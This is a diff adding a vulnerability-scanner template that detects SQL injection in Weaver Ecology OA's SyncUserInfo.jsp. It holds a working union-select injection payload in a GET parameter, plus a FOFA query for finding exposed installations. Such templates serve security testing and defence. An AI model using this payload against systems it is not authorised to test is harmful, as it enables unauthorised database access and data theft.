@@ -1,0 +1,39 @@
+id: ecology-syncuserinfo-sqli
+time: "2022-09-28"
+
+info:
+  name: Ecology Syncuserinfo - SQL Injection
+  author: ritikchaddha
+  severity: critical
+  description: Syncuserinfo包含一个通过GET请求的SQL注入漏洞。攻击者可能从数据库获取敏感信息，修改数据.
+  reference: https://github.com/chaitin/xray/blob/master/pocs/ecology-syncuserinfo-sqli.yml
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-89
+  metadata:
+    max-request: 1
+    fofa-query: app="泛微-协同办公OA"
+  tags: ecology,sqli
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null"
+
+    host-redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        part: body
+        words:
+          - "4386499557"
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/09/28
